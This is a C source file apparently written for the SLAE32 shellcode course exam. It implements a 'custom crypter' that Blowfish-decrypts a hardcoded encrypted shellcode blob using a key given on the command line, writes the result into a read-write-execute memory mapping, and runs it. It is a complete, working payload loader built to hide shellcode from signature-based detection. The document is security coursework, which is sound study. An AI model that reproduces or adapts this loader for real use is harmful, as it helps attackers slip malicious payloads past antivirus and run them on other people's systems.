/*
A7 - Custom Crypter
SLAE32 Exam
William Moody
PA-25640
*/

#include <stdio.h>
#include <string.h>
#include <sys/mman.h>
#include <errno.h>

#include "blowfish.h"

void main (int argc, char *argv[])
{
	if (argc != 2)
	{
		printf("Usage: %s <key>\n", argv[0]);
		return;
	}

	unsigned char* key = argv[1];

	BLOWFISH_CTX ctx;
	Blowfish_Init(&ctx, key, strlen(key));
	
	// SET SHELLCODE LENGTH AND CONTENT HERE //
	int c_len = 80;
	unsigned char *ciphertext = \
	"\x51\xe1\xb3\x27\xdc\x64\x04\xb1\x8b\x8c\xcd\x0c\xb4\x5b\x72\x8f"
	"\x0d\xd7\x2c\xd9\xf3\x4f\xb3\x52\x17\x9d\x13\x82\x23\xac\x0e\x09"
	"\xdd\x54\x67\x98\x1b\x95\xe9\xec\x51\xdc\xba\x47\x8c\xff\x0f\x00"
	"\x09\xda\x79\x24\x12\x4e\x60\x40\x8e\xa7\x18\xe9\xdd\x29\xc6\x4e"
	"\x1f\x51\xdb\x61\x65\xa1\x6d\x73\x81\xc8\x57\xcf\xbe\x26\x67\xd5";
	////////////////////////////////////////////

	int s_len = 0;
	unsigned char shellcode[256];

	long unsigned int m_left;
	long unsigned int m_right;
	int blocklen;

	printf("[*] Decrypting shellcode...");

	int i = 0;
	while (i < c_len)
	{
		m_left = m_right = 0;

		for (blocklen = 0; blocklen < 4; blocklen++)
		{
			m_left = m_left << 8;
			if (i < c_len)
			{
				m_left += ciphertext[i++];
			}
			else m_left += 0;
		}
		for (blocklen = 0; blocklen < 4; blocklen++)
		{
			m_right = m_right << 8;
			if (i < c_len)
			{
				m_right += ciphertext[i++];
			}
			else m_right += 0;
		}

		Blowfish_Decrypt(&ctx, &m_left, &m_right);

		shellcode[s_len++] = (unsigned char)(m_left >> 24);
		shellcode[s_len++] = (unsigned char)(m_left >> 16);
		shellcode[s_len++] = (unsigned char)(m_left >> 8);
		shellcode[s_len++] = (unsigned char)(m_left);
		shellcode[s_len++] = (unsigned char)(m_right >> 24);
		shellcode[s_len++] = (unsigned char)(m_right >> 16);
		shellcode[s_len++] = (unsigned char)(m_right >> 8);
		shellcode[s_len++] = (unsigned char)(m_right);
	}

	printf("OK\n");

	printf("[*] Creating executable buffer...\n");
	char *buf;
	int prot = PROT_READ | PROT_WRITE | PROT_EXEC;
	int flags = MAP_PRIVATE | MAP_ANONYMOUS;
	buf = mmap(0, sizeof(shellcode), prot, flags, -1, 0);

	printf("[*] Copying shellcode into buffer (%d bytes)...\n", strlen(shellcode));
	memcpy(buf, shellcode, sizeof(shellcode));

	printf("[*] Running shellcode...\n\n");
	((void (*)(void))buf)();    
}
